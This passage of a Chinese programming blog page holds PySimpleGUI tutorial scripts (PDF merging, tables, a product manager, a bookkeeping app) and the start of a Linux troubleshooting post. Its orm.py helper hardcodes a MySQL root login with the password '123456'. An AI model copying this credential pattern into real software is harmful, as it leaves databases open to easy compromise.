output.addPage(<span class="built_in">input</span>.getPage(iPage))</span><br><span class="line">        sg.cprint(<span class="string">&#x27;合并后的总页数：%d.&#x27;</span> % output_pages)</span><br><span class="line">        <span class="comment"># 写入到目标PDF文件</span></span><br><span class="line">        output_stream = <span class="built_in">open</span>(os.path.join(filepath, output_file), <span class="string">&#x27;wb&#x27;</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            output.write(output_stream)</span><br><span class="line">            output_stream.close()</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            sg.cprint(<span class="string">&#x27;合并失败，请重试&#x27;</span>,text_color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        sg.cprint(<span class="string">&#x27;PDF合并完成！&#x27;</span>,text_color=<span class="string">&#x27;green&#x27;</span>)</span><br><span class="line">        sg.cprint(<span class="string">f&#x27;合并后的文件路径：<span class="subst">&#123;filepath&#125;</span>/<span class="subst">&#123;output_file&#125;</span>&#x27;</span>, )</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sg.cprint(<span class="string">&#x27;没有可以合并的PDF文件！&#x27;</span>,text_color=<span class="string">&#x27;red&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    layout = [</span><br><span class="line">        [sg.T(<span class="string">&#x27;选择文件夹：&#x27;</span>, size=(<span class="number">18</span>, <span class="number">1</span>)), sg.In(key=<span class="string">&#x27;-file_dir-&#x27;</span>), sg.FolderBrowse()],</span><br><span class="line">        [sg.T(<span class="string">&#x27;输入合并后的文件名：&#x27;</span>, size=(<span class="number">18</span>, <span class="number">1</span>)), sg.In(key=<span class="string">&#x27;-output_file-&#x27;</span>), sg.B(<span class="string">&#x27;开始合并&#x27;</span>)],</span><br><span class="line">        [sg.ML(size=(<span class="number">80</span>, <span class="number">15</span>),reroute_cprint=<span class="literal">True</span>,text_color=<span class="string">&#x27;purple&#x27;</span>)],</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    window = sg.Window(<span class="string">&#x27;PDF合并工具&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        event, values = window.read()</span><br><span class="line">        file_dir = values[<span class="string">&#x27;-file_dir-&#x27;</span>]</span><br><span class="line">        output_file = values[<span class="string">&#x27;-output_file-&#x27;</span>]  <span class="comment"># 输出的PDF文件的名称</span></span><br><span class="line">        <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> event == <span class="string">&#x27;开始合并&#x27;</span>:</span><br><span class="line">            PDFMerge(file_dir, output_file)</span><br><span class="line"></span><br><span class="line">    window.close()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h1 id="46表格元素的设定方法-py"><a href="#46表格元素的设定方法-py" class="headerlink" title="46表格元素的设定方法.py"></a>46表格元素的设定方法.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">a=[<span class="string">&#x27;编号&#x27;</span>,<span class="string">&#x27;商品&#x27;</span>,<span class="string">&#x27;价格&#x27;</span>,<span class="string">&#x27;   &#x27;</span>,<span class="string">&#x27;   &#x27;</span>,<span class="string">&#x27;   &#x27;</span>]</span><br><span class="line">b=[[<span class="string">&#x27;001&#x27;</span>,<span class="string">&#x27;牛奶&#x27;</span>,<span class="string">&#x27;5&#x27;</span>],[<span class="string">&#x27;002&#x27;</span>,<span class="string">&#x27;苹果&#x27;</span>,<span class="string">&#x27;6&#x27;</span>],[<span class="string">&#x27;003&#x27;</span>,<span class="string">&#x27;香烟&#x27;</span>,<span class="string">&#x27;10&#x27;</span>]]</span><br><span class="line">layout=[</span><br><span class="line">    [sg.Table(b, <span class="comment">#表格内容</span></span><br><span class="line">              headings=a, <span class="comment"># 表格头部</span></span><br><span class="line">              max_col_width=<span class="number">500</span>, <span class="comment"># 所有列的最大宽度</span></span><br><span class="line">              auto_size_columns=<span class="literal">False</span>, <span class="comment"># 是否自动适应列宽度</span></span><br><span class="line">              def_col_width=<span class="number">10</span>, <span class="comment"># 定义列表宽度</span></span><br><span class="line">              display_row_numbers=<span class="literal">False</span>, <span class="comment"># 是否显示序号列</span></span><br><span class="line">              justification=<span class="string">&#x27;l&#x27;</span>, <span class="comment"># 对齐方式</span></span><br><span class="line">              num_rows=<span class="number">10</span>, <span class="comment"># 定义行数</span></span><br><span class="line">              row_height=<span class="number">20</span>, <span class="comment"># 定义行高</span></span><br><span class="line">              key=<span class="string">&#x27;-a-&#x27;</span>,</span><br><span class="line">              font=(<span class="string">&#x27;黑体&#x27;</span>,<span class="number">10</span>),</span><br><span class="line">              text_color=<span class="literal">None</span>,</span><br><span class="line">              background_color=<span class="string">&#x27;red&#x27;</span>,</span><br><span class="line">              enable_events=<span class="literal">True</span>,</span><br><span class="line">              bind_return_key=<span class="literal">True</span>,</span><br><span class="line">        )]</span><br><span class="line">]</span><br><span class="line">window = sg.Window(<span class="string">&#x27;菜单演示&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event, values = window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># if event == &#x27;打开::open&#x27;:</span></span><br><span class="line">    <span class="comment">#     sg.Popup(&#x27;ggg&#x27;)</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="47商品管理系统-py"><a href="#47商品管理系统-py" class="headerlink" title="47商品管理系统.py"></a>47商品管理系统.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> orm</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line">sql=<span class="string">&quot;SELECT * FROM products;&quot;</span></span><br><span class="line">data=orm.getData(sql)</span><br><span class="line">menu=[<span class="string">&#x27;商品管理&#x27;</span>,[<span class="string">&#x27;商品展示&#x27;</span>,<span class="string">&#x27;查找商品&#x27;</span>,<span class="string">&#x27;添加商品&#x27;</span>,<span class="string">&#x27;删除商品&#x27;</span>,<span class="string">&#x27;修改商品&#x27;</span>]],[<span class="string">&#x27;订单管理&#x27;</span>,[<span class="string">&#x27;查看订单&#x27;</span>,<span class="string">&#x27;查找订单&#x27;</span>,<span class="string">&#x27;添加订单&#x27;</span>,<span class="string">&#x27;删除订单&#x27;</span>,<span class="string">&#x27;修改订单&#x27;</span>]],[<span class="string">&#x27;帮助&#x27;</span>]</span><br><span class="line"><span class="built_in">list</span>=[<span class="string">&#x27;商品展示&#x27;</span>,<span class="string">&#x27;增加商品&#x27;</span>,<span class="string">&#x27;删除商品&#x27;</span>,<span class="string">&#x27;修改商品&#x27;</span>]</span><br><span class="line">header=[<span class="string">&#x27;序号&#x27;</span>,<span class="string">&#x27;商品编号&#x27;</span>,<span class="string">&#x27;商品名称&#x27;</span>,<span class="string">&#x27;商品金额&#x27;</span>,<span class="string">&#x27;商品数量&#x27;</span>]</span><br><span class="line">layout=[</span><br><span class="line">	[sg.Menu(menu,)],</span><br><span class="line">	[sg.Button(i) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">list</span>],</span><br><span class="line">	[sg.Table(data,headings=header,justification=<span class="string">&#x27;c&#x27;</span>,auto_size_columns=<span class="literal">False</span>)]</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">window = sg.Window(<span class="string">&#x27;商品管理系统&#x27;</span>, layout)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    event, values = window.read()</span><br><span class="line">    <span class="built_in">print</span>(event)</span><br><span class="line">    <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># if event == &#x27;打开::open&#x27;:</span></span><br><span class="line">    <span class="comment">#     sg.Popup(&#x27;ggg&#x27;)</span></span><br><span class="line"></span><br><span class="line">window.close()</span><br></pre></td></tr></table></figure>

<h1 id="orm-py"><a href="#orm-py" class="headerlink" title="orm.py"></a>orm.py</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pymysql</span><br><span class="line"></span><br><span class="line">host=<span class="string">&#x27;192.168.200.2&#x27;</span></span><br><span class="line">port=<span class="number">3306</span></span><br><span class="line">user=<span class="string">&#x27;root&#x27;</span></span><br><span class="line">password=<span class="string">&#x27;123456&#x27;</span></span><br><span class="line">dbName=<span class="string">&#x27;zbcdb&#x27;</span></span><br><span class="line">charset=<span class="string">&#x27;utf8&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getConnection</span>():</span><br><span class="line">	db=pymysql.Connect(host=host,port=port,user=user,passwd=password,db=dbName,charset=charset)</span><br><span class="line">	<span class="keyword">return</span> db</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getData_users</span>(<span class="params">sql</span>):</span><br><span class="line">	db=getConnection()</span><br><span class="line">	cursor=db.cursor()</span><br><span class="line">	data=<span class="literal">None</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		cursor.execute(sql)</span><br><span class="line">		data=cursor.fetchone() <span class="comment"># 获取单行结果</span></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;发生错误：&#x27;</span>,e)</span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		<span class="comment"># 关闭数据库连接和游标</span></span><br><span class="line">		cursor.close()</span><br><span class="line">		db.close()</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查询商品及订单数据库</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">getData</span>(<span class="params">sql</span>):</span><br><span class="line">	db=getConnection()</span><br><span class="line">	cursor=db.cursor()</span><br><span class="line">	data=<span class="literal">None</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		cursor.execute(sql)</span><br><span class="line">		data=cursor.fetchall() <span class="comment"># 获取多行结果</span></span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;发生错误：&#x27;</span>,e)</span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		<span class="comment"># 关闭数据库连接和游标</span></span><br><span class="line">		cursor.close()</span><br><span class="line">		db.close()</span><br><span class="line">	<span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入数据</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeData</span>(<span class="params">sql</span>):</span><br><span class="line">	db=getConnection()</span><br><span class="line">	cursor=db.cursor()</span><br><span class="line">	result=<span class="literal">None</span></span><br><span class="line">	<span class="keyword">try</span>:</span><br><span class="line">		result=cursor.execute(sql)</span><br><span class="line">		db.commit() <span class="comment"># 更新操作时需要提交</span></span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;----数据已更新！&#x27;</span>,result)</span><br><span class="line">	<span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;发生错误：&#x27;</span>,e)</span><br><span class="line">	<span class="keyword">finally</span>:</span><br><span class="line">		cursor.close()</span><br><span class="line">		db.close()</span><br><span class="line">	<span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<h1 id="桌面应用开发实例"><a href="#桌面应用开发实例" class="headerlink" title="桌面应用开发实例"></a>桌面应用开发实例</h1><h2 id="1-记账本-py"><a href="#1-记账本-py" class="headerlink" title="1.记账本.py"></a>1.记账本.py</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line"><span class="keyword">import</span> PySimpleGUI <span class="keyword">as</span> sg</span><br><span class="line"><span class="comment"># d = &#x27;[&#123;&quot;时间&quot;: &quot;2022/05/07 14:20:21&quot;, &quot;项目&quot;: &quot;收到贷款&quot;, &quot;金额&quot;: 20000, &quot;分类&quot;: &quot;收入&quot;&#125;]&#x27;</span></span><br><span class="line"><span class="comment"># with open(r&quot;data.txt&quot;, &quot;w&quot;) as f:</span></span><br><span class="line"><span class="comment">#     f.write(d)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">readData</span>():</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;data.txt&quot;</span>, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsonData=f.read()</span><br><span class="line">        dataList=json.loads(jsonData)</span><br><span class="line">        <span class="keyword">return</span> dataList</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">writeData</span>(<span class="params">dateList</span>): <span class="comment"># 写入数据</span></span><br><span class="line">    jsonData=json.dumps(dateList,ensure_ascii=<span class="literal">False</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;data.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        jsonData=f.write(jsonData)</span><br><span class="line">        sg.popup(<span class="string">&#x27;账单录入成功&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">showData</span>():</span><br><span class="line">    data = readData()</span><br><span class="line">    dataLists=[]</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> d[<span class="string">&quot;分类&quot;</span>] == <span class="string">&quot;收入&quot;</span>:</span><br><span class="line">            dataList=[d[<span class="string">&quot;时间&quot;</span>],d[<span class="string">&quot;项目&quot;</span>],d[<span class="string">&quot;金额&quot;</span>],d[<span class="string">&quot;分类&quot;</span>]]</span><br><span class="line">            dataLists.append(dataList)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            dataList=[d[<span class="string">&quot;时间&quot;</span>],d[<span class="string">&quot;项目&quot;</span>],d[<span class="string">&quot;金额&quot;</span>]*-<span class="number">1</span>,d[<span class="string">&quot;分类&quot;</span>]]</span><br><span class="line">            dataLists.append(dataList)</span><br><span class="line">    <span class="keyword">return</span> dataLists</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sumin</span>():</span><br><span class="line">    sumin = <span class="number">0</span></span><br><span class="line">    data=readData()</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> d[<span class="string">&quot;分类&quot;</span>] == <span class="string">&quot;收入&quot;</span>:</span><br><span class="line">            sumin += d[<span class="string">&quot;金额&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> sumin</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sumout</span>(): <span class="comment"># 总支出计算</span></span><br><span class="line">    sumout = <span class="number">0</span></span><br><span class="line">    data=readData()</span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> data:</span><br><span class="line">        <span class="keyword">if</span> d[<span class="string">&quot;分类&quot;</span>] == <span class="string">&quot;支出&quot;</span>:</span><br><span class="line">            sumout += d[<span class="string">&quot;金额&quot;</span>]</span><br><span class="line">    <span class="keyword">return</span> sumout</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addData</span>(<span class="params">content,amount,cla</span>): <span class="comment"># 增加账目数据</span></span><br><span class="line">    dataList=readData()</span><br><span class="line">    t=datetime.datetime.now().strftime(<span class="string">&quot;%Y/%m/%d %H:%M:%S&quot;</span>)</span><br><span class="line">    data=&#123;<span class="string">&quot;时间&quot;</span>:t, <span class="string">&quot;项目&quot;</span>:content, <span class="string">&quot;金额&quot;</span>:amount, <span class="string">&quot;分类&quot;</span>:cla&#125;</span><br><span class="line">    dataList.append(data)</span><br><span class="line">    writeData(dataList)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    <span class="built_in">list</span>=showData()</span><br><span class="line">    sin = sumin()</span><br><span class="line">    sout = sumout()</span><br><span class="line">    layout=[</span><br><span class="line">        [sg.T(<span class="string">&quot;账目清单：&quot;</span>)],</span><br><span class="line">        [sg.Table(<span class="built_in">list</span>,headings=[<span class="string">&quot;时间&quot;</span>,<span class="string">&quot;项目&quot;</span>,<span class="string">&quot;金额&quot;</span>,<span class="string">&quot;分类&quot;</span>],</span><br><span class="line">                  key=<span class="string">&quot;-show-&quot;</span>,</span><br><span class="line">                  justification=<span class="string">&quot;c&quot;</span>,</span><br><span class="line">                  auto_size_columns=<span class="literal">False</span>,</span><br><span class="line">                  def_col_width=<span class="number">15</span></span><br><span class="line">        )],</span><br><span class="line">        [sg.T(<span class="string">&quot;总收入&quot;</span>+<span class="built_in">str</span>(sin)+<span class="string">&quot;元，总支出&quot;</span>+<span class="built_in">str</span>(sout)+<span class="string">&quot;元，结余&quot;</span>+<span class="built_in">str</span>(sin-sout)+<span class="string">&quot;元&quot;</span>,key=<span class="string">&quot;-text-&quot;</span>)],</span><br><span class="line">        [sg.T(<span class="string">&quot;请输入账单项目：&quot;</span>),sg.In(key=<span class="string">&quot;-content-&quot;</span>)],</span><br><span class="line">        [sg.T(<span class="string">&quot;请输入账单金额：&quot;</span>),sg.In(key=<span class="string">&quot;-amount-&quot;</span>)],</span><br><span class="line">        [sg.T(<span class="string">&quot;请输入账单分类：&quot;</span>)]+[sg.Radio(i,group_id=<span class="number">1</span>,key=i)<span class="keyword">for</span> i <span class="keyword">in</span> [<span class="string">&quot;收入&quot;</span>,<span class="string">&quot;支出&quot;</span>]],</span><br><span class="line">        [sg.B(<span class="string">&quot;确认提交&quot;</span>)]</span><br><span class="line">    </span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    window=sg.Window(<span class="string">&quot;记账本&quot;</span>,layout)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        event,values=window.read()</span><br><span class="line">        <span class="keyword">if</span> event == <span class="string">&quot;确认提交&quot;</span>:</span><br><span class="line">            content=values[<span class="string">&quot;-content-&quot;</span>]</span><br><span class="line">            amount=<span class="built_in">float</span>(values[<span class="string">&quot;-amount-&quot;</span>])</span><br><span class="line">            <span class="keyword">for</span> k,v <span class="keyword">in</span> values.items():</span><br><span class="line">                <span class="keyword">if</span> v == <span class="literal">True</span>:</span><br><span class="line">                    cla=k</span><br><span class="line">                    addData(content,amount,cla)</span><br><span class="line">                    <span class="built_in">list</span>=showData()</span><br><span class="line">                    sin=sumin()</span><br><span class="line">                    sout=sumout()</span><br><span class="line">                    text=<span class="string">&quot;总收入&quot;</span>+<span class="built_in">str</span>(sin)+<span class="string">&quot;元，总支出&quot;</span>+<span class="built_in">str</span>(sout)+<span class="string">&quot;元，结余&quot;</span>+<span class="built_in">str</span>(sin-sout)+<span class="string">&quot;元&quot;</span></span><br><span class="line">                    window[<span class="string">&quot;-show-&quot;</span>].update(values=<span class="built_in">list</span>)</span><br><span class="line">                    window[<span class="string">&quot;-text-&quot;</span>].update(value=text)</span><br><span class="line">                    window[<span class="string">&quot;-content-&quot;</span>].update(<span class="string">&quot;&quot;</span>)</span><br><span class="line">                    window[<span class="string">&quot;-amount-&quot;</span>].update(<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> event == <span class="literal">None</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    window.close()</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>

<h2 id="data-txt"><a href="#data-txt" class="headerlink" title="data.txt"></a>data.txt</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[&#123;&quot;时间&quot;: &quot;2022/05/07 14:20:21&quot;, &quot;项目&quot;: &quot;收到贷款&quot;, &quot;金额&quot;: 20000, &quot;分类&quot;: &quot;收入&quot;&#125;, &#123;&quot;时间&quot;: &quot;2022/05/14 13:31:01&quot;, &quot;项目&quot;: &quot;a&quot;, &quot;金额&quot;: 20.0, &quot;分类&quot;: &quot;支出&quot;&#125;, &#123;&quot;时间&quot;: &quot;2022/05/14 13:42:46&quot;, &quot;项目&quot;: &quot;b&quot;, &quot;金额&quot;: 20.0, &quot;分类&quot;: &quot;收入&quot;&#125;, &#123;&quot;时间&quot;: &quot;2022/05/14 13:44:49&quot;, &quot;项目&quot;: &quot;s&quot;, &quot;金额&quot;: 31.0, &quot;分类&quot;: &quot;收入&quot;&#125;, &#123;&quot;时间&quot;: &quot;2022/05/14 13:45:09&quot;, &quot;项目&quot;: &quot;n&quot;, &quot;金额&quot;: 67.0, &quot;分类&quot;: &quot;支出&quot;&#125;, &#123;&quot;时间&quot;: &quot;2022/05/14 13:45:18&quot;, &quot;项目&quot;: &quot;t&quot;, &quot;金额&quot;: 65.0, &quot;分类&quot;: &quot;收入&quot;&#125;]</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/17/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94-linux/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="Private">
      <meta itemprop="description" content="程序语言记录">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="PeacefulRace">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/17/%E7%96%91%E9%9A%BE%E8%A7%A3%E7%AD%94-linux/" class="post-title-link" itemprop="url">疑难解答-Linux</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2022-08-17 10:16:24" itemprop="dateCreated datePublished" datetime="2022-08-17T10:16:24+08:00">2022-08-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2022-08-31 14:43:06" itemprop="dateModified" datetime="2022-08-31T14:43:06+08:00">2022-08-31</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/troubleshooting/" itemprop="url" rel="index"><span itemprop="name">troubleshooting</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="vim不能复制粘贴"><a href="#vim不能复制粘贴" class="headerlink" title="vim不能复制粘贴"></a>vim不能复制粘贴</h1><p>远程登录上liunx服务器上，使用vim打开文本，遇到windows内容不能粘贴到文本里，文本内容不能粘贴到windows上的问题。</p>
<p>解决方法：</p>
<p>Esc退出插入模式,输入</p>
<p>set mouse=v<br>即可，但是只是临时有效，下次进入还的从新设置。</p>
<p>可以将设置写入vim配置文件中</p>
<p>配置文件是家目录下.vimc文件，然后source .vimc使配置生效</p>
<h1 id="Linux下mysql-5-6重置root密码-https-www-cnblogs-com-xzlive-p-12758788-html"><a href="#Linux下mysql-5-6重置root密码-https-www-cnblogs-com-xzlive-p-12758788-html" class="headerlink" title="Linux下mysql-5.6重置root密码](https://www.cnblogs.com/xzlive/p/12758788.html)"></a>Linux下mysql-5.6重置root密码](<a target="_blank" rel="noopener" href="https://www.cnblogs.com/xzlive/p/12758788.html">https://www.cnblogs.com/xzlive/p/12758788.html</a>)</h1><p><strong>1. 检查<code>mysql</code>服务是否启动，如果启动，关闭<code>mysql</code>服务</strong></p>
<p>运行命令：<code>ps -ef | grep -i mysql</code></p>
<p><img src="https://img2018.cnblogs.com/blog/1411470/201909/1411470-20190929173649786-1102739601.png" alt="img"></p>
